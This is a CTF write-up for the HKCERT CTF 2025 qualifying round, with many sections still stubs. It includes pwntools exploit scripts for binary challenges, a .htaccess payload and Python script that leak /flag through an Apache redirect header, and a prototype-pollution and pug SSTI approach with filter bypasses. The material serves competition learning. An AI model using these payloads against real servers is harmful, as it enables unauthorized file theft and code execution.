---
title: HKCERT CTF 2025 (预选赛) WriteUp
pubDate: 2026-02-27T21:14:00
category: Write Up
---
## Binary Exploitation

### link start!-施工中

> 爆裂流星！！！！
> Burst meteor!!!!

#### OOB数组越界解法

##### EXP

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("192.168.66.129", 7000)

    return r


def main():
    p = conn()

    p.sendlineafter(b"login:", b"hero")

    p.recv()

    p.recvuntil(b"choice>> ")
    p.sendline(b"3")
    p.recvuntil(b"choice>> ")
    p.sendline(b"-88")

    for i in range(4):
        p.recvuntil(b"choice>> ")
        p.sendline(b"1")

        p.recvuntil(b"use hiden methods?(1:yes/0:no):")
        p.sendline(b"0")

    p.recvuntil(b"what's your name:")

    payload = b"A" * 64
    p.send(payload)

    p.recvuntil(b"I know what you want. I will remember you, ")

    p.recv(64)
    flag = p.recvline().strip().decode(errors="ignore")

    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
```

#### 官方解法

一个游戏，英雄打怪兽的

```c
void init()
{
  unsigned int seed; // [rsp+8h] [rbp-58h]
  char name[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v2; // [rsp+58h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  seed = time(0LL);
  srand(seed);
  init_io();
  if ( access(manager_db, 0) && mkdir(manager_db, 0x1EDu) == -1 )
  {
    perror("mkdir error");
  }
  else
  {
    chdir(manager_db);
    while ( 1 )
    {
      printf("login:");
      read_buff(name, 64LL, 10LL);
      if ( (unsigned int)check_name(name) )
        break;
      puts("bad name");
    }
    if ( access(name, 0) )
    {
      puts("welcome to the system!");
      init_new_db_file(name);
    }
    else
    {
      puts("welcome back to the system!");
    }
    init_db(name);
    gMonster = (__int64)malloc(0x58uLL);
    init_monster(0LL);
    init_hero();
  }
}
```

从`init()`函数的伪代码中我们可以看到程序将玩家名作为参数传递给了函数`init_new_db_file`，进入函数发现程序将新玩家的技能配置文件保存到了位于`db_dir/{username}`的文件中，随后`init_db`函数使用`mmap`将配置文件直接映射到内存中，但这个程序没有设置文件锁，这为静态竞争创造了条件，我们可以同时多次登录一个账户，并修改文件内容，在主程序运行过程中实时改变玩家的属性

##### EXP

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("192.168.66.129", 7000)

    return r


def main():
    p1 = conn()
    p2 = conn()
    def login(p):
        p.sendlineafter(b"login:", b"a")

    def attack(p):
        p.sendlineafter(b"choice>> ", b"1")

    def use_hide(p, choice):
        p.sendlineafter(b"(1:yes/0:no):", str(choice).encode())

    def change_skill(p, choice):
        p.sendlineafter(b"choice>> ", b"3")
        p.sendlineafter(b"choice>> ", str(choice).encode())

    def god_attack(p1, p2):

        change_skill(p1, 3)
        attack(p1)

        change_skill(p2, 1)

        use_hide(p1, 1)

    login(p1)
    login(p2)

    while True:
        god_attack(p1, p2)
        data = p1.recvuntil(b"\n")
        if b"you win" in data:
            data = p1.recvuntil(b"\n")
            if b"remember you forever!" in data:
                break

    print("Hero defeated the monster. Proceeding to leak flag...")
    p1.recvuntil(b"name:")
    # Send long payload to overwrite null terminator and leak stack data
    p1.send(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa")

    p1.interactive()


if __name__ == "__main__":
    main()
```

### a_strange_rop-施工中

> 二十以內的加法對小學生來說有點難了，對高中生來說有點簡單了，對大學生來說剛剛好！！！ 誒，所以全對以後的獎勵呢？？？
> Adding up to 20 is a bit difficult for elementary school students, a bit simple for high school students, and just right for college students!!! Hey, so what about future rewards???

#### EXP

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("192.168.66.129", 7000)

    return r


def main():
    p = conn()

    p.recvuntil("Question Number:")
    p.sendline(b"-1")
    p.recvuntil("Result:")
    p.sendline(b"4199136")

    p.recvuntil("Question Number:")
    p.sendline(b"-2")
    p.recvuntil("Result:")
    p.sendline(b"4210808")

    p.recvuntil("Question Number:")
    # gdb.attach(p,"b *0x40148C")
    p.sendline(b"-3")
    p.recvuntil("Result:")
    p.sendline(b"4199153")

    p.interactive()


if __name__ == "__main__":
    main()
```

### childcode-施工中

> "Some"body once claimed "the father of 4", but I have been hunting for the true number behind binary. Finally, I see the pattern. "syscall" is 0f05 (15, 5). '\n' is 10. "ret" is 0xc3 (195). These vital instructions are all multiples of 5. Therefore, 5 is the master of binary, and I have named the code "the child of 5". Do you have what it takes? Show me your childcode.

### compress-施工中

> smaller

### filesystem-施工中

> 這是個能夠讀取文件的程序，來看看有沒有你想要的文件吧o(￣▽￣)ブ。
> This is a program that can read files. Let's see if there are any files you want o(￣▽￣)ブ.

### filesystem-revenge-施工中

> 這是個能夠讀取文件的程序，來看看有沒有你想要的文件吧o(￣▽￣)ブ。
> This is a program that can read files. Let's see if there are any files you want o(￣▽￣)ブ.

### nofile-施工中

> 衰了，唔單文件冇佐，伺服器的shell也連不上了，只剩下一個服務還在運行。
> Decline, not only files are missing, but also the server's shell I can't connect anymore, only one service is still running.

### piano-施工中

> piano, pianissimo, pianississimo</br>
> **The challenge environment will execute the following command to set up a restricted execution context:**
> /chroot --userspec=1000:1000 /home/ctf /run.sh
> ```run.sh
> #!/bin/sh
> ./qjs ./tmp.js
> ```

### stop-施工中

> You'd better stop and leave right now.

## Cryptography

### Bivariate copper-施工中

> 那麼問題來了，什麼是copper？
> So the question is, what is copper?

### ComCompleXX-施工中

> 我最近開始迷上數學了，但這題看起來真的很複複複雜，你能幫我嗎？
> I've recently become obsessed with math, but this problem seems really comcomplexx. Can you help me?

### EC Fun-施工中

> 密碼學很簡單！祝你玩得開心！
> Crypto is so EC! May you have fun!

### LWECC-施工中

> Easy ECC...and LWE maybe

### Loss N-施工中

> 沒有那個n，我照樣可以解出flag。
> Even without that n, I can still solve the flag.

### POC-施工中

> Easy AES Challenge

### Triple Key Cipher-施工中

> 我實現了一個使用三個密鑰的分組密碼算法。
> I implemented a block cipher algorithm that uses three keys.

### Try E-施工中

> e這麼大...何意味？
> E is so big... what does it mean?

### cruel_rsa-施工中

> cute rsa? oh nonono, so cruel

## Miscellaneous

### Chimedal's goddess-施工中

> Chimedal帶上了99朵玫瑰，決定向心心念念的女神表白，可女神卻給了他一張小紙條，上面是一段奇奇怪怪的資訊，如果Chimedal能破解這段資訊的話，女神就答應跟他在一起。作為Chimedal最好的朋友的你，能否幫Chimedal抱得美人歸呢？
> 請注意：flag需要添加flag{}后提交，flag包含下劃綫`“_”`和空格`“ ”`
> Chimedal brought 99 roses, determined to confess to the goddess he had been longing for. However, the goddess gave him a small note containing a strange message. If Chimedal could decipher this message, she would agree to be with him. As Chimedal's best friend, can you help him win the heart of his beloved?
> Please note: The flag needs to be submitted after adding flag{} and the flag contains underscore (_) and space ( )

### Deleted-施工中

> Despite taking the fastest action, the suspect still noticed us and cleared the evidence from the computer before we arrived. Please help us find as many useful clues as possible.
> Attachment password:`==###HkCert2025###==`
> Note:
> 1. Answer all of question with UTC+8 timezone.
> 2. When you need to work with the registry, please be careful not to overwrite your machine's registry. You can also perform the analysis in a virtual machine.
> The attachment link is as follows:
> https://drive.google.com/file/d/1DM14noGC5YdBb4gGmPX41gM4MLlvoYZS/view?usp=sharing
> MD5 hash of attachment.zip:
> 7f559bb45323d512cf65c384009b4f31

### Easy_Base-施工中

> 新人，學院給了你一套能殺死龍王的武器，但上面的文字好像有點看不清啊（flag格式為：flag{xx_xx}）
> Newcomer, the academy has given you a set of weapons capable of killing the Dragon King, but the text on them seems a bit hard to read (flag format: flag{xx_xx})

### LOVE-施工中

> 看起來我的模型有過擬合的情況。你能幫我看看嗎？
> It seems like my model is overfitting. Can you take a look for me?

### Little Wish-施工中

> Oh, the music stopped! Alright everyone — clap along and follow my lead! We'll keep it going together!

### Personal Health Assistant-施工中

> Healx has developed a personal health assistant app and has decided to hire a senior AI safety expert to test the app before its launch.

### Protocol-施工中

> Try to Talk With Private Protocol

### Questionnaire-施工中

> 問卷連結/Questionnaire Link:
> https://forms.hkcert.org/hkcertctf2025-evaluation
> Please note that there should be no spaces in the submitted flag.The flag format is ctf2025{}

### Suspicious File-施工中

> We captured a suspicious file transmitted through a covert channel, analyzed it and found out the secrets.
> The flag format is hkcert25{}

### busbus-施工中

> A device has been implanted with a backdoor, attempting to trigger it and leak sensitive information.

### easyJail-施工中

> Very easy pickle jail，go ahead !



## Reverse Engineering

### JN-施工中

> 怎麽有的函數看不到
> Why can't some functions be seen

### Wm-施工中

> Have you heard of wasm

### abc-施工中

> bc文件是什麽
> bc What is the file

### box-施工中

> Hello, I found a box. Could you open it

### easydriver-施工中

> 一個簡單的驅動。
> A simple driver.
> 注：
> - flag提交格式：flag{youget}
> - 如果系統出現藍屏，請確保自身環境純淨，本驅動不會對系統進行任何破壞性操作，盡請放心。
> - 解題推薦使用64位Win10 - Win11 22H2的虛擬機系統。
> Note:
> - flag Submission format: flag{youget}
> - If the system shows a blue screen, please ensure that your environment is pure. This driver will not perform any destructive operations on the system, so please rest assured.
> - Recommended use of 64 bit for problem-solving Win10 - Win11 22H2 The virtual machine system.

### easyjar-施工中

> Reverse engineering a simple algorithm

### easyre-施工中

> Reverse a simple algorithm

### eert-施工中

> 開始考察數據結構
> Start investigating data structures

### ezc-施工中

> 隨機密鑰怎麽辦？
> What about the random key?
> flag提交格式：flag{youget}
> flag Submission format: flag{youget}

### findkey-施工中

> 鑰匙找不到了
> I can't find the key

### onebyone-施工中

> 需要解密哦
> We need to decrypt it



## Web Exploitation

### BabyUpload

> “This is a simple file upload service.
> The administrator said, ‘I hate the letter “P”. Anything containing “P” is not allowed in!’”

打开页面，可以看到一个名为 "P-Phobia Upload" 的文件上传界面。
*   尝试上传 `shell.php` 失败或被拦截。
*   尝试上传 `test.txt` 或图片文件成功，并返回路径 `/test/test.txt`。

本题过滤了PHP扩展名，且运行在 Apache 服务器上，尝试上传 `.htaccess` 文件成功，既然我们可以上传 `.htaccess` 文件，就可以控制 Apache 如何处理该目录下的文件
常见的利用策略包括：

- 将图片解析为 PHP：使用 `AddType application/x-httpd-php .jpg`。但在 "P-Phobia" 设置下，`<?php` 内容可能会被过滤，或者服务器可能禁用了其他扩展名的 PHP 解析
- 利用 Apache 表达式泄露文件：这是一种非远程代码执行(Non-RCE)的解法，可以直接读取flag文件

Apache 2.4.x 支持表达式解析器 (Expression Parser)，我们可以利用 `Redirect` 指令重定向请求，并将目标文件的内容包含在重定向的 URL 中

Payload 构造：

```apache
redirect permanent "/%{BASE64:%{FILE:/flag}}"
```

*   `redirect permanent`: 使用 301 状态码进行重定向。
*   `%{FILE:/flag}`: 从文件系统中读取 `/flag` 文件的内容。
*   `%{BASE64:...}`: 将读取的内容进行 Base64 编码，防止换行符或特殊字符破坏 HTTP 头部结构。

解题步骤

第一步：创建恶意的 .htaccess 文件
创建一个名为 `.htaccess` 的文件，内容如下：
```apache
redirect permanent "/%{BASE64:%{FILE:/flag}}"
```

第二步：上传文件
通过挑战页面上传该文件。建议将 `Content-Type` 修改为 `application/octet-stream` 以避免被识别为文本文件而被检测（尽管该挑战可能只检查文件扩展名）。

第三步：触发漏洞
上传成功后，访问上传目录下的任意文件（即使该文件不存在），例如：
`http://target/uploads/.htaccess` 或 `http://target/uploads/non_exist`

Apache 会匹配 `.htaccess` 中的规则，尝试读取 `/flag` 文件，并执行重定向操作。

第四步：获取 Flag
观察 HTTP 响应头（可以通过浏览器开发者工具或 Python 脚本）：

```http
HTTP/1.1 301 Moved Permanently
Date: Sun, 07 Dec 2025 01:01:08 GMT
Location: http://localhost:12223/ZmxhZ3sxNTA4NzhmNC1lYzU0LTQyZWQtOTcwYi03NTc4NWE3ZDBkOGR9IA==
```

从 `Location` 头部提取 Base64 字符串：
`ZmxhZ3sxNTA4NzhmNC1lYzU0LTQyZWQtOTcwYi03NTc4NWE3ZDBkOGR9IA==`

解码后得到 Flag：
`flag{150878f4-ec54-42ed-970b-75785a7d0d8d}`

EXP 脚本 (Python)

```python
import requests
import base64
import re

url = "http://192.168.91.100:82/"

# 1. 上传恶意的 .htaccess 文件
files = {
    'file': ('.htaccess', 'redirect permanent "/%{BASE64:%{FILE:/flag}}"', 'application/octet-stream')
}
requests.post(url, files=files)

# 2. 访问任意路径以触发重定向
# allow_redirects=False 至关重要，否则我们会跟随重定向而错过 301 响应头
r = requests.get(url + "test", allow_redirects=False)

# 3. 提取 Location 头部并解码
if r.status_code == 301:
    loc = r.headers.get('Location', '')
    print(f"Location Header: {loc}")
    
    if loc:
        # 提取最后一部分 (Base64 字符串)
        b64_flag = loc.split("/")[-1]
        
        # 解码
        try:
            # 如果需要，修复填充位
            missing_padding = len(b64_flag) % 4
            if missing_padding:
                b64_flag += '=' * (4 - missing_padding)
            
            flag = base64.b64decode(b64_flag).decode()
            print(f"Flag: {flag}")
        except Exception as e:
            print(f"Decoding failed: {e}")
else:
    print(f"Redirect not triggered. Status Code: {r.status_code}")
```

### Dam Breach-施工中

> “The magnificent CloudBeaver stands guard over the torrent of data.”

### Labyrinth-施工中

> Welcome to the labyrinth of serialization. There are no familiar Roman roads or spring gardens here—only high walls all around. Find the hidden ‘tracking’ path, and only then can you break free from the maze.

### easy-lua-施工中

> A Lua online executor

### ezjs

> Come and try some code auditing!

题目给了环境和附件，先看一下附件，有app.js和package.json文件，先对app.js进行一下简单的审计

- /login 路由接收输入数据并修改session以进行身份识别，但直接传入"admin"会被过滤，无法通过
- /render 路由直接使用pugjs渲染数据

因为给了package文件，所以可以在本地运行服务，`npm i`后发现json5.parse方法存在原型链污染漏洞[Prototype Pollution in JSON5 via Parse Method](https://github.com/advisories/GHSA-9c47-m6qq-7p4h)，而/login路由在处理输入时恰好使用了该方法，所以我们可以利用原型链污染直接将`admin`属性污染为`true`，从而绕过登陆限制
![[assets/HKCERT-CTF/2025-qualify_round/ezjs/ezjs-HKCERT-CTF-2025-qualify_round-e8a5ed385cfbce.png]]

![[assets/HKCERT-CTF/2025-qualify_round/ezjs/ezjs-HKCERT-CTF-2025-qualify_round-e0f40a01c5d6f2.png]]

获取到admin权限的session后，访问/render路由，通过信息收集发现pugjs存在SSTI漏洞[Remote code execution via the `pretty` option.](https://github.com/advisories/GHSA-p493-635q-r6gr)，可以通过相应的payload实现命令执行进行攻击

通过检查源代码发现`"require"`和`"exec"`被过滤了，绕过`require`可以使用`constructor._load`来代替，绕过`exec`可以使用`spawn`来代替

![[assets/HKCERT-CTF/2025-qualify_round/ezjs/ezjs-HKCERT-CTF-2025-qualify_round-b32660bfafd841.png]]

### insph-施工中

> We've developed an advanced AI data processing system that can intelligently process data from any URL. The system is already deployed on a server; can you find the hidden flag within it?

### nettool-施工中

> Let’s do a code audit.

### newrule-施工中

> Bill Jobs developed an intelligent login system, but there is a vulnerability in one of the Header headers for the login. Can you help him find the vulnerability? This is a beneficial behavior for the body.

### r-施工中

> object reference and pointer reference

### react-施工中

> The developer jumped on the trend and used the latest Next.js 15 to build the application.

### renderme-施工中

> “I wrote a simple page to render your name.”